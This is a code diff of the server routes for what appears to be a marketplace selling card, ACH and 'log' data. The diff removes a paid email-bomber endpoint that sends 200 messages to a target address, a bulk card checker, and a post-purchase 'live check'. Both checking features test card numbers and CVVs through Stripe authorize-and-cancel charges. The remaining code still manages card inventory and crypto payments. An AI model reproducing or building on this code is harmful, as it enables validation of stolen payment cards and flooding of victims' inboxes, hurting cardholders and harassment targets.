@@ -5,32 +5,25 @@ import { storage } from "./storage";
 import { setupAuth, isFounderIdentity } from "./auth";
 import { api } from "@shared/routes";
 import { z } from "zod";
-import { scrypt, randomBytes, timingSafeEqual } from "crypto";
 import { createNowPaymentsInvoice, getNowPaymentsInvoice, mapNowPaymentsStatus, verifyNowPaymentsWebhook } from "./nowpayments";
 import { hashPassword, comparePassword } from "./auth";
-import { cryptoPayments, orders, orderItems, verifications, variants, userIps, users, mails, mailReads, discountCodes, transactions, stockItems, cards, achs, products, redeemCodes } from "@shared/schema";
+import { cryptoPayments, orders, orderItems, variants, userIps, users, mails, mailReads, discountCodes, transactions, stockItems, cards, achs, products, redeemCodes } from "@shared/schema";
 import { db } from "./db";
 import { eq, and, ne, desc, sql } from "drizzle-orm";
-import nodemailer from "nodemailer";
 import { calculateDepositCredit } from "@shared/deposit";
 import {
   deleteApiSetting,
   getApiSettingDefinition,
   getRuntimeSetting,
   listApiSettings,
-  normalizeCustomSettingKey,
   saveApiSetting,
   setApiSettingEnabled,
 } from "./settings";
-import { restartTelegramBot } from "./telegram";
 
 function isAdminOrWorker(req: any): boolean {
   const u = req.user as any;
   return req.isAuthenticated() && (u?.role === 'admin' || u?.isWorker === true);
 }
-
-// In-memory store for email bomb jobs
-const emailBombJobs = new Map<string, { sent: number; total: number; status: "running" | "done" | "failed" }>();
 
 // BIN lookup cache + throttle queue (binlist.net = ~10 req/min free tier)
 const binCache = new Map<string, any>();
@@ -316,7 +309,7 @@ export async function registerRoutes(
         type: "crypto" as const,
         amount: p.amount,
         status: p.status,
-        paymentId: p.forebitPaymentId,
+        paymentId: p.nowPaymentsPaymentId,
         checkoutUrl: p.checkoutUrl,
         createdAt: p.createdAt,
       }));
@@ -560,25 +553,6 @@ export async function registerRoutes(
     }
   });
 
-
-  // Telegram — generate a one-time link token (valid 1 hour)
-  app.post("/api/telegram/link-token", async (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "Not authenticated" });
-    try {
-      const userId = (req.user as any).id;
-      const token = randomBytes(24).toString("hex");
-      await db.execute(sql`
-        DELETE FROM telegram_link_tokens WHERE user_id = ${userId}
-      `);
-      await db.execute(sql`
-        INSERT INTO telegram_link_tokens (token, user_id) VALUES (${token}, ${userId})
-      `);
-      res.json({ token });
-    } catch (e: any) {
-      res.status(500).json({ message: e.message });
-    }
-  });
-
   // User Rank
   app.get("/api/user/rank", async (req, res) => {
     if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
@@ -655,131 +629,6 @@ export async function registerRoutes(
       res.json(user);
     } catch (e: any) {
       res.status(400).json({ message: e.message });
-    }
-  });
-
-  // Verification - Submit
-  app.post("/api/verification/submit", async (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
-    try {
-      const userId = (req.user as any).id;
-      const { telegramUsername, channelLink, channelName, agreedToTerms } = req.body;
-      if (!agreedToTerms) return res.status(400).json({ message: "Must agree to terms" });
-      const existing = await db.select().from(verifications).where(eq(verifications.userId, userId));
-      if (existing.length > 0) {
-        const existingStatus = existing[0].status;
-        if (existingStatus === "approved") {
-          return res.status(400).json({ message: "Already verified" });
-        }
-        const [updated] = await db.update(verifications).set({ telegramUsername, channelLink, channelName, agreedToTerms, status: "pending" as any, adminNote: "", termMessage: "" }).where(eq(verifications.userId, userId)).returning();
-        return res.json(updated);
-      }
-      const [verif] = await db.insert(verifications).values({ userId, telegramUsername, channelLink, channelName, agreedToTerms }).returning();
-      res.status(201).json(verif);
-    } catch (e: any) {
-      res.status(400).json({ message: e.message });
-    }
-  });
-
-  // Verification - Get Mine
-  app.get("/api/verification/me", async (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
-    const [verif] = await db.select().from(verifications).where(eq(verifications.userId, (req.user as any).id));
-    res.json(verif || null);
-  });
-
-  // Admin - List Verifications
-  app.get("/api/admin/verifications", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== 'admin') return res.status(401).json({ message: "Unauthorized" });
-    const all = await db.select().from(verifications).orderBy(verifications.createdAt);
-    res.json(all);
-  });
-
-  // Admin - Approve Verification
-  app.post("/api/admin/verifications/:id/approve", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== 'admin') return res.status(401).json({ message: "Unauthorized" });
-    const [verif] = await db.update(verifications).set({ status: "approved" as any, adminNote: req.body.note || "" }).where(eq(verifications.id, Number(req.params.id))).returning();
-    res.json(verif);
-  });
-
-  // Admin - Deny Verification
-  app.post("/api/admin/verifications/:id/deny", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== 'admin') return res.status(401).json({ message: "Unauthorized" });
-    const [verif] = await db.update(verifications).set({ status: "denied" as any, adminNote: req.body.note || "" }).where(eq(verifications.id, Number(req.params.id))).returning();
-    res.json(verif);
-  });
-
-  // Admin - Term a seller (ban with message)
-  app.post("/api/admin/verifications/:id/term", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== 'admin') return res.status(401).json({ message: "Unauthorized" });
-    const [verif] = await db.update(verifications).set({ status: "termed" as any, termMessage: req.body.message || "" }).where(eq(verifications.id, Number(req.params.id))).returning();
-    res.json(verif);
-  });
-
-  // Admin - Unverify a seller (revoke, must reapply)
-  app.post("/api/admin/verifications/:id/unverify", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== 'admin') return res.status(401).json({ message: "Unauthorized" });
-    const [verif] = await db.update(verifications).set({ status: "denied" as any, adminNote: "Verification revoked by admin" }).where(eq(verifications.id, Number(req.params.id))).returning();
-    res.json(verif);
-  });
-
-  // Admin - Sellers list (all submitted verifications for management)
-  app.get("/api/admin/sellers", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== 'admin') return res.status(401).json({ message: "Unauthorized" });
-    try {
-      const { rows } = await db.execute(sql`
-        SELECT v.id, v.user_id, v.telegram_username, v.channel_link, v.channel_name,
-               v.agreed_to_terms, v.status, v.admin_note, v.term_message, v.created_at,
-               u.id as u_id, u.username as u_username, u.email as u_email
-        FROM verifications v
-        LEFT JOIN users u ON u.id = v.user_id
-        ORDER BY v.created_at DESC
-      `) as any;
-      const result = [];
-      for (const row of rows) {
-        if (!row.u_id) continue;
-        const { rows: ipRows } = await db.execute(sql`SELECT ip FROM user_ips WHERE user_id = ${row.user_id} ORDER BY logged_at DESC`) as any;
-        const uniqueIps = Array.from(new Set(ipRows.map((i: any) => i.ip)));
-        result.push({
-          id: row.id, userId: row.user_id, telegramUsername: row.telegram_username,
-          channelLink: row.channel_link, channelName: row.channel_name,
-          agreedToTerms: row.agreed_to_terms, status: row.status,
-          adminNote: row.admin_note, termMessage: row.term_message, createdAt: row.created_at,
-          user: { id: row.u_id, username: row.u_username, email: row.u_email },
-          ips: uniqueIps, totalLogins: ipRows.length,
-        });
-      }
-      res.json(result);
-    } catch (e: any) {
-      console.error("sellers route error:", e);
-      res.status(500).json({ message: e.message });
-    }
-  });
-
-  // Admin - Approved sellers only (for mail recipient dropdown)
-  app.get("/api/admin/sellers/approved", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== 'admin') return res.status(401).json({ message: "Unauthorized" });
-    try {
-      const { rows } = await db.execute(sql`
-        SELECT v.id, v.user_id, v.telegram_username, v.channel_link, v.channel_name,
-               v.agreed_to_terms, v.status, v.admin_note, v.term_message, v.created_at,
-               u.id as u_id, u.username as u_username, u.email as u_email
-        FROM verifications v
-        LEFT JOIN users u ON u.id = v.user_id
-        WHERE v.status = 'approved'
-        ORDER BY v.created_at DESC
-      `) as any;
-      const result = rows.filter((r: any) => r.u_id).map((row: any) => ({
-        id: row.id, userId: row.user_id, telegramUsername: row.telegram_username,
-        channelLink: row.channel_link, channelName: row.channel_name,
-        agreedToTerms: row.agreed_to_terms, status: row.status,
-        adminNote: row.admin_note, termMessage: row.term_message, createdAt: row.created_at,
-        user: { id: row.u_id, username: row.u_username, email: row.u_email },
-      }));
-      res.json(result);
-    } catch (e: any) {
-      console.error("sellers/approved route error:", e);
-      res.status(500).json({ message: e.message });
     }
   });
 
@@ -1577,7 +1426,7 @@ export async function registerRoutes(
 
       await db.insert(cryptoPayments).values({
         userId,
-        forebitPaymentId: invoice.id,
+        nowPaymentsPaymentId: invoice.id,
         amount: totalWithFee,
         currency: "USD",
         status: "pending",
@@ -1637,7 +1486,7 @@ export async function registerRoutes(
 
       await db.insert(cryptoPayments).values({
         userId,
-        forebitPaymentId: invoice.id,
+        nowPaymentsPaymentId: invoice.id,
         amount: Math.round(amountUsd * 100),
         currency: "USD",
         status: "pending",
@@ -1654,9 +1503,6 @@ export async function registerRoutes(
     }
   });
 
-  // Keep legacy alias so any in-flight links still resolve
-  app.post("/api/payments/forebit/create", (req, res) => res.redirect(307, "/api/payments/crypto/create"));
-
   app.get("/api/payments/crypto/:paymentId/status", async (req, res) => {
     if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
 
@@ -1667,7 +1513,7 @@ export async function registerRoutes(
       const [localPayment] = await db
         .select()
         .from(cryptoPayments)
-        .where(eq(cryptoPayments.forebitPaymentId, paymentId))
+        .where(eq(cryptoPayments.nowPaymentsPaymentId, paymentId))
         .limit(1);
 
       if (!localPayment || localPayment.userId !== userId) {
@@ -1706,10 +1552,6 @@ export async function registerRoutes(
     }
   });
 
-  // Legacy alias
-  app.get("/api/payments/forebit/:paymentId/status", (req, res) =>
-    res.redirect(307, `/api/payments/crypto/${req.params.paymentId}/status`));
-
   app.post("/api/webhooks/nowpayments", async (req, res) => {
     try {
       console.log("NOWPayments IPN received:", JSON.stringify(req.body, null, 2));
@@ -1734,7 +1576,7 @@ export async function registerRoutes(
       const [payment] = await db
         .select()
         .from(cryptoPayments)
-        .where(eq(cryptoPayments.forebitPaymentId, invoiceId))
+        .where(eq(cryptoPayments.nowPaymentsPaymentId, invoiceId))
         .limit(1);
 
       if (!payment) {
@@ -1820,7 +1662,7 @@ export async function registerRoutes(
     }
     const { method } = req.params;
     const { enabled } = req.body;
-    if (!["crypto", "stars", "cashapp", "wallet", "chime", "zelle", "venmo"].includes(method) || typeof enabled !== "boolean") {
+    if (!["crypto", "cashapp", "wallet", "chime", "zelle", "venmo"].includes(method) || typeof enabled !== "boolean") {
       return res.status(400).json({ message: "Invalid request" });
     }
     await storage.setSetting(`payment_method_${method}`, String(enabled));
@@ -1832,17 +1674,13 @@ export async function registerRoutes(
     if (!req.isAuthenticated() || (req.user as any).role !== "admin") {
       return res.status(401).json({ message: "Unauthorized" });
     }
-    const [telegramToken, nowPaymentsKey, nowPaymentsSecret, stripeKey] = await Promise.all([
-      getRuntimeSetting("telegram_bot_token"),
+    const [nowPaymentsKey, nowPaymentsSecret] = await Promise.all([
       getRuntimeSetting("nowpayments_api_key"),
       getRuntimeSetting("nowpayments_ipn_secret"),
-      getRuntimeSetting("stripe_secret_key"),
     ]);
     res.json({
-      TELEGRAM_BOT_TOKEN: !!telegramToken,
       NOWPAYMENTS_API_KEY: !!nowPaymentsKey,
       NOWPAYMENTS_IPN_SECRET: !!nowPaymentsSecret,
-      STRIPE_SECRET_KEY: !!stripeKey,
     });
   });
 
@@ -1861,29 +1699,6 @@ export async function registerRoutes(
     }
   });
 
-  app.post("/api/admin/api-settings", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== "admin") {
-      return res.status(401).json({ message: "Unauthorized" });
-    }
-    try {
-      const { name, kind, value, enabled, label } = req.body;
-      if (typeof name !== "string" || typeof kind !== "string" || !["url", "secret", "text"].includes(kind)) {
-        return res.status(400).json({ message: "Name and a valid setting type are required." });
-      }
-      const key = normalizeCustomSettingKey(name);
-      await saveApiSetting({
-        key,
-        kind: kind as "url" | "secret" | "text",
-        value: typeof value === "string" ? value : "",
-        enabled: typeof enabled === "boolean" ? enabled : true,
-        label: typeof label === "string" ? label.trim() : name.trim(),
-      });
-      res.status(201).json({ ok: true, key });
-    } catch (error: any) {
-      res.status(400).json({ message: error?.message || "Unable to save API setting." });
-    }
-  });
-
   app.put("/api/admin/api-settings/:key", async (req, res) => {
     if (!req.isAuthenticated() || (req.user as any).role !== "admin") {
       return res.status(401).json({ message: "Unauthorized" });
@@ -1891,26 +1706,19 @@ export async function registerRoutes(
     try {
       const key = String(req.params.key);
       const definition = getApiSettingDefinition(key);
-      if (!definition && !key.startsWith("custom_")) {
+      if (!definition) {
         return res.status(404).json({ message: "Setting not found." });
       }
-      const { value, enabled, kind, label } = req.body;
+      const { value, enabled } = req.body;
       if (value !== undefined && typeof value !== "string") {
         return res.status(400).json({ message: "Setting value must be text." });
       }
-      if (!definition && !["url", "secret", "text"].includes(kind)) {
-        return res.status(400).json({ message: "A valid setting type is required." });
-      }
       await saveApiSetting({
         key,
-        kind: definition?.kind ?? kind,
+        kind: definition.kind,
         value,
         enabled: typeof enabled === "boolean" ? enabled : undefined,
-        label: typeof label === "string" ? label.trim() : undefined,
       });
-      if (key === "telegram_bot_token" || key === "telegram_group_id") {
-        restartTelegramBot().catch((error) => console.error("[telegram] settings refresh failed:", error?.message || error));
-      }
       res.json({ ok: true });
     } catch (error: any) {
       res.status(400).json({ message: error?.message || "Unable to save API setting." });
@@ -1926,10 +1734,10 @@ export async function registerRoutes(
       if (typeof req.body.enabled !== "boolean") {
         return res.status(400).json({ message: "Enabled must be true or false." });
       }
-      await setApiSettingEnabled(key, req.body.enabled);
-      if (key === "telegram_bot_token" || key === "telegram_group_id") {
-        restartTelegramBot().catch((error) => console.error("[telegram] settings refresh failed:", error?.message || error));
+      if (!getApiSettingDefinition(key)) {
+        return res.status(404).json({ message: "Setting not found." });
       }
+      await setApiSettingEnabled(key, req.body.enabled);
       res.json({ ok: true });
     } catch (error: any) {
       res.status(400).json({ message: error?.message || "Unable to update API setting." });
@@ -1942,13 +1750,10 @@ export async function registerRoutes(
     }
     try {
       const key = String(req.params.key);
-      if (!getApiSettingDefinition(key) && !key.startsWith("custom_")) {
+      if (!getApiSettingDefinition(key)) {
         return res.status(404).json({ message: "Setting not found." });
       }
       await deleteApiSetting(key);
-      if (key === "telegram_bot_token" || key === "telegram_group_id") {
-        restartTelegramBot().catch((error) => console.error("[telegram] settings refresh failed:", error?.message || error));
-      }
       res.json({ ok: true });
     } catch (error: any) {
       res.status(400).json({ message: error?.message || "Unable to clear API setting." });
@@ -2313,78 +2118,6 @@ export async function registerRoutes(
     );
   }
 
-  // ── Email Bomber ──────────────────────────────────────────────
-  app.post("/api/tools/email-bomb", async (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
-    const { email } = req.body;
-    if (!email || typeof email !== "string" || !/\S+@\S+\.\S+/.test(email)) {
-      return res.status(400).json({ message: "Valid target email required" });
-    }
-
-    const user = req.user as any;
-    const COST = 50; // $0.50 in cents
-    if ((user.balance || 0) < COST) {
-      return res.status(400).json({ message: "Insufficient balance — need $0.50" });
-    }
-
-      const smtpEmail = await getRuntimeSetting("smtp_email", "");
-      const smtpPassword = await getRuntimeSetting("smtp_password", "");
-      const smtpHost = await getRuntimeSetting("smtp_host", "smtp.gmail.com");
-      const smtpPort = parseInt((await getRuntimeSetting("smtp_port", "587")) || "587");
-
-    if (!smtpEmail || !smtpPassword) {
-      return res.status(500).json({ message: "SMTP not configured — contact admin" });
-    }
-
-    // Deduct balance
-    await storage.updateUserBalance(user.id, -COST);
-    await storage.createTransaction(user.id, -COST, "email_bomb", `Email bomb → ${email}`);
-
-    const jobId = randomBytes(8).toString("hex");
-    const job = { sent: 0, total: 200, status: "running" as const };
-    emailBombJobs.set(jobId, job);
-
-    res.json({ jobId, total: 200 });
-
-    // Run bomb in background
-    (async () => {
-      try {
-        const transporter = nodemailer.createTransport({
-          host: smtpHost,
-          port: smtpPort,
-          secure: smtpPort === 465,
-          auth: { user: smtpEmail, pass: smtpPassword },
-          tls: { rejectUnauthorized: false },
-        });
-
-        const j = emailBombJobs.get(jobId)!;
-        for (let i = 0; i < 200; i++) {
-          try {
-            await transporter.sendMail({
-              from: smtpEmail,
-              to: email,
-              subject: `Notification #${i + 1}`,
-              text: `You have a new message. (${i + 1} of 200)`,
-            });
-          } catch (_) {}
-          j.sent = i + 1;
-          if (i < 199) await new Promise((r) => setTimeout(r, 500));
-        }
-        j.status = "done";
-      } catch {
-        const j = emailBombJobs.get(jobId);
-        if (j) j.status = "failed";
-      }
-    })();
-  });
-
-  app.get("/api/tools/email-bomb/:jobId", (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
-    const job = emailBombJobs.get(req.params.jobId);
-    if (!job) return res.status(404).json({ message: "Job not found" });
-    res.json(job);
-  });
-
   // ── ACH ──────────────────────────────────────────────────────
   app.get("/api/ach", async (req, res) => {
     if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
@@ -2478,32 +2211,6 @@ export async function registerRoutes(
     res.json({ success: true });
   });
 
-
-  // ── SMTP Settings (admin) ──────────────────────────────────────
-  app.get("/api/admin/smtp", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== "admin") {
-      return res.status(401).json({ message: "Unauthorized" });
-    }
-    const smtp_host = await getRuntimeSetting("smtp_host", "smtp.gmail.com");
-    const smtp_port = await getRuntimeSetting("smtp_port", "587");
-    const smtp_email = await getRuntimeSetting("smtp_email", "");
-    // Never return the password
-    const has_password = Boolean(await getRuntimeSetting("smtp_password", ""));
-    res.json({ smtp_host, smtp_port, smtp_email, has_password });
-  });
-
-  app.post("/api/admin/smtp", async (req, res) => {
-    if (!req.isAuthenticated() || (req.user as any).role !== "admin") {
-      return res.status(401).json({ message: "Unauthorized" });
-    }
-    const { smtp_host, smtp_port, smtp_email, smtp_password } = req.body;
-    if (smtp_host) await saveApiSetting({ key: "smtp_host", kind: "text", value: String(smtp_host) });
-    if (smtp_port) await saveApiSetting({ key: "smtp_port", kind: "text", value: String(smtp_port) });
-    if (smtp_email) await saveApiSetting({ key: "smtp_email", kind: "text", value: String(smtp_email) });
-    if (smtp_password) await saveApiSetting({ key: "smtp_password", kind: "secret", value: String(smtp_password) });
-    res.json({ message: "SMTP settings saved" });
-  });
-
   // === SELLER APPLICATIONS ===
   app.get("/api/seller/me", async (req, res) => {
     if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
@@ -2559,152 +2266,23 @@ export async function registerRoutes(
 
   // === FEATURE FLAGS ===
   app.get("/api/settings/features", async (_req, res) => {
-    const checker = await storage.getSetting("feature_checker", "true");
     const reseller = await storage.getSetting("feature_reseller", "true");
     const ranks = await storage.getSetting("feature_ranks", "true");
     const logs = await storage.getSetting("feature_logs", "true");
     const cards = await storage.getSetting("feature_cards", "true");
-    res.json({ checker: checker !== "false", reseller: reseller !== "false", ranks: ranks !== "false", logs: logs !== "false", cards: cards !== "false" });
+    res.json({ reseller: reseller !== "false", ranks: ranks !== "false", logs: logs !== "false", cards: cards !== "false" });
   });
 
   app.post("/api/admin/settings/features", async (req, res) => {
     if (!req.isAuthenticated() || (req.user as any).role !== "admin") {
       return res.status(401).json({ message: "Unauthorized" });
     }
-    const { checker, reseller, ranks, logs, cards } = req.body;
-    if (checker !== undefined) await storage.setSetting("feature_checker", checker ? "true" : "false");
+    const { reseller, ranks, logs, cards } = req.body;
     if (reseller !== undefined) await storage.setSetting("feature_reseller", reseller ? "true" : "false");
     if (ranks !== undefined) await storage.setSetting("feature_ranks", ranks ? "true" : "false");
     if (logs !== undefined) await storage.setSetting("feature_logs", logs ? "true" : "false");
     if (cards !== undefined) await storage.setSetting("feature_cards", cards ? "true" : "false");
     res.json({ ok: true });
-  });
-
-  // === CARD CHECKER ===
-  app.post("/api/checker/check", async (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
-    const userId = (req.user as any).id;
-    const { cards: cardList } = req.body;
-    if (!Array.isArray(cardList) || cardList.length === 0) {
-      return res.status(400).json({ message: "No cards provided" });
-    }
-
-    const costPerCard = 10;
-    const totalCost = cardList.length * costPerCard;
-
-    const [dbUser] = await db.select().from(users).where(eq(users.id, userId));
-    if (!dbUser || dbUser.balance < totalCost) {
-      return res.status(400).json({ message: `Insufficient balance. Need $${(totalCost / 100).toFixed(2)}, have $${((dbUser?.balance ?? 0) / 100).toFixed(2)}` });
-    }
-
-    const stripeKey = await getRuntimeSetting("stripe_secret_key");
-    if (!stripeKey) return res.status(500).json({ message: "Card checker not configured. Contact admin." });
-
-    await db.update(users).set({ balance: sql`balance - ${totalCost}` }).where(eq(users.id, userId));
-    await db.insert(transactions).values({
-      userId, amount: -totalCost, type: "purchase",
-      description: `Card checker — ${cardList.length} card${cardList.length !== 1 ? "s" : ""}`,
-      paymentMethod: "Wallet",
-    });
-
-    const { default: Stripe } = await import("stripe");
-    const stripe = new Stripe(stripeKey);
-
-    const results: any[] = [];
-    for (const card of cardList) {
-      try {
-        const num = String(card.number ?? "").replace(/[\s\-]/g, "");
-        const dateRaw = String(card.date ?? "").replace(/\//g, "").trim();
-        const cvv = String(card.cvv ?? "").trim();
-
-        let expMonth: number, expYear: number;
-        if (dateRaw.length === 4) { expMonth = parseInt(dateRaw.slice(0, 2)); expYear = 2000 + parseInt(dateRaw.slice(2)); }
-        else if (dateRaw.length === 6) { expMonth = parseInt(dateRaw.slice(0, 2)); expYear = parseInt(dateRaw.slice(2)); }
-        else throw new Error("Invalid date format (use MM/YY)");
-
-        const pm = await stripe.paymentMethods.create({ type: "card", card: { number: num, exp_month: expMonth, exp_year: expYear, cvc: cvv } } as any);
-        const pi = await stripe.paymentIntents.create({
-          amount: 80, currency: "usd", payment_method: pm.id,
-          confirm: true, capture_method: "manual", return_url: "https://nychq.cc",
-        } as any);
-        if ((pi as any).status === "requires_capture") await stripe.paymentIntents.cancel(pi.id);
-        results.push({ number: card.number, date: card.date, cvv: card.cvv, status: "approved" });
-      } catch (err: any) {
-        const errMsg = err?.raw?.message || err?.message || "Declined";
-        results.push({ number: card.number, date: card.date, cvv: card.cvv, status: "declined", error: errMsg });
-      }
-    }
-
-    res.json({ results, charged: totalCost });
-  });
-
-  // === LIVE CHECK (card orders) ===
-  app.post("/api/orders/:id/live-check", async (req, res) => {
-    if (!req.isAuthenticated()) return res.status(401).json({ message: "Unauthorized" });
-    const userId = (req.user as any).id;
-    const order = await storage.getOrder(Number(req.params.id));
-    if (!order || order.userId !== userId) return res.status(404).json({ message: "Order not found" });
-
-    const isCard = (order.orderId ?? "").startsWith("CARD-") || order.items?.some((i: any) => i.itemType === "card");
-    if (!isCard) return res.status(400).json({ message: "Not a card order" });
-
-    if (Date.now() - new Date(order.createdAt).getTime() > 15 * 60 * 1000) {
-      return res.status(400).json({ message: "Live check window expired (15 minutes after purchase)" });
-    }
-
-    const fee = 50;
-    const [dbUser] = await db.select().from(users).where(eq(users.id, userId));
-    if (!dbUser || dbUser.balance < fee) {
-      return res.status(400).json({ message: "Insufficient balance. Live check costs $0.50" });
-    }
-
-    let cardContent = order.deliveryContent || "";
-    if (!cardContent) {
-      const cardItem = order.items?.find((i: any) => i.itemType === "card" && i.card);
-      if (cardItem?.card) {
-        cardContent = [cardItem.card.cardNumber, cardItem.card.expiry, cardItem.card.cvv].filter(Boolean).join("|");
-      }
-    }
-    if (!cardContent) return res.status(400).json({ message: "No card data found on this order" });
-
-    const parts = cardContent.split(/[|]+/).map((s: string) => s.trim()).filter(Boolean);
-    const num = (parts[0] ?? "").replace(/\D/g, "");
-    const dateRaw = (parts[1] ?? "").replace(/\//g, "").trim();
-    const cvv = (parts[2] ?? "").trim();
-
-    let expMonth: number, expYear: number;
-    if (dateRaw.length === 4) { expMonth = parseInt(dateRaw.slice(0, 2)); expYear = 2000 + parseInt(dateRaw.slice(2)); }
-    else if (dateRaw.length === 6) { expMonth = parseInt(dateRaw.slice(0, 2)); expYear = parseInt(dateRaw.slice(2)); }
-    else return res.status(400).json({ message: "Could not parse card expiry date" });
-
-    const stripeKey = await getRuntimeSetting("stripe_secret_key");
-    if (!stripeKey) return res.status(500).json({ message: "Live check not configured. Contact admin." });
-
-    await db.update(users).set({ balance: sql`balance - ${fee}` }).where(eq(users.id, userId));
-    await db.insert(transactions).values({
-      userId, amount: -fee, type: "purchase",
-      description: `Live check fee — ${order.orderId}`, paymentMethod: "Wallet",
-    });
-
-    const { default: Stripe } = await import("stripe");
-    const stripe = new Stripe(stripeKey);
-
-    try {
-      const pm = await stripe.paymentMethods.create({ type: "card", card: { number: num, exp_month: expMonth, exp_year: expYear, cvc: cvv } } as any);
-      const pi = await stripe.paymentIntents.create({
-        amount: 50, currency: "usd", payment_method: pm.id,
-        confirm: true, capture_method: "manual", return_url: "https://nychq.cc",
-      } as any);
-      if ((pi as any).status === "requires_capture") await stripe.paymentIntents.cancel(pi.id);
-      return res.json({ live: true, message: "Card is Live! ✅" });
-    } catch (err: any) {
-      await db.update(users).set({ balance: sql`balance + ${fee}` }).where(eq(users.id, userId));
-      await db.insert(transactions).values({
-        userId, amount: fee, type: "refund",
-        description: `Live check refund — ${order.orderId}`, paymentMethod: "Wallet",
-      });
-      return res.json({ live: false, message: "Card Declined — $0.50 refunded to your wallet." });
-    }
   });
 
   return httpServer;
